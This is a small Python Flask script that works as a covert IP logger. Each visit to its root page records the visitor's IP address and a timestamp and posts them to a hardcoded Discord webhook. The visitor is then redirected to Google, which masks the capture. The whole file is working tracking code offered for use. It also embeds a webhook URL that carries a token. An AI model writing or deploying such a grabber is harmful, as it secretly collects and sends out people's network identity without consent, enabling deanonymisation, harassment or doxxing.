from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1344881157820645446/rpXnv3VK5xQj7YqfiuXFZwXI4IaSajbcRGQoEE44x1HKheo47xMuXXszNE91fXkaDUgB" #Outdated webhook to avoid hijacking
    data = {
        "content": f"New IP Logged: {ip}",
        "embeds": [
            {
                "title": "IP Logger",
                "description": f"**IP:** {ip}\n**Date:** {date}",
                "color": 16711680  # Red color (optional)
            }
        ]
    }
    
    response = requests.post(webhook_url, json=data)
    
    # Debugging: Print response to check for errors
    print(response.status_code, response.text)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)  # Fixed typo
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    send_ip(ip, date)

    return redirect("https://google.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0")
